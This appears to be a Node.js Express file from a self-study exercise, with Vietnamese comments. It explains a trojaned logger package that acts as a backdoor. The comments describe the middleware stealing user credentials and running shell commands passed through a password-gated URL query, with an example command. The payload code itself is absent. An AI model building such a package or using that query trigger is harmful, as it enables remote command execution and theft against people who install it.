// # Backdoor

const express = require("express");
const app = express();

const myLogger = require("./logger");
app.use(myLogger()); // Client request đến trang web này sẽ bị logger của ta bắt làm backdoor

app.get("/", function (req, res) {
    res.send("Hello world");
});
app.listen(3000, () => {
    console.log("Application is up on port 3000");
});

// User là ai đó cài package của ta; backdoor là server hack nhận được data; logger là nơi trung gian middleware lấy
// dữ liệu của user khi user có url query nhất định; childprocess là học về fs.watch, spawn, exec; Child và Parent
// là học về fork; master và support là 1 ví dụ khác về fork; supportlib là thư viện bổ trợ process

// Cách test: chạy user -> chạy backdoor -> người dùng vào user backdoor nhận dược thông tin
// Giả sử ng dùng vào link có query: http://localhost:3000/?pwd=secret-pwd&cmd=node%20--version
// thì backdoor sẽ thực thi lệnh node --version trên user và nhận được client này đang dùng nodejs version bao nhiêu
// Nếu có trường tk, mk ở đây thì backdoor sẽ lấy được hét. File user.js này là file của user cài package logger của
// ta chứa mã độc
